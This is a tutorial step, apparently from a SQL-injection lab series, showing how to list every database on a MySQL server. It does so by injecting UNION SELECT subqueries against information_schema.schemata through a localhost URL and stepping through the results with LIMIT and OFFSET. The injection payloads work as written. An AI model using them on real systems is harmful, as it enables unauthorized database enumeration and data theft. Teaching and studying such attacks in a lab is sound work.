# (d) Get all databases

The plan here is to **list all databases** in the database server.

So MySQL store information about all databases in a special database called [information_schema](http://dev.mysql.com/doc/refman/5.7/en/information-schema.html).
To get the name of all databases we have to query the table **SCHEMATA** of that database.

The query may look like this:
```shell
SELECT schema_name FROM information_schema.schemata
```

We can inject that query via browser, just like in the previous steps:
```shell
http://localhost:8080/p/2 UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata),3,4,5,6,7,8,9,10/slug-name-post'
```

But we will get this error:
```javascript
{
  "status": "Error",
  "message": "ER_SUBQUERY_NO_1_ROW: Subquery returns more than 1 row"
}
```

This is because the query returns more than one row. So we have to *limit* the output, listing the databases **one by one**, like this:
```shell
http://localhost:8080/p/2 UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 1),3,4,5,6,7,8,9,10/slug-name-post'
```

So now we have the first database. For the next one we can use the OFFSET trick, like this:
```shell
http://localhost:8080/p/2 UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1),3,4,5,6,7,8,9,10/slug-name-post'
```

With this OFFSET trick we are skipping the first database and getting the second one. Then we skip another one to get the next one:
```shell
http://localhost:8080/p/2 UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 2),3,4,5,6,7,8,9,10/slug-name-post'
```

We keep skipping until getting all the databases.

And that is it!! Mission accomplished!
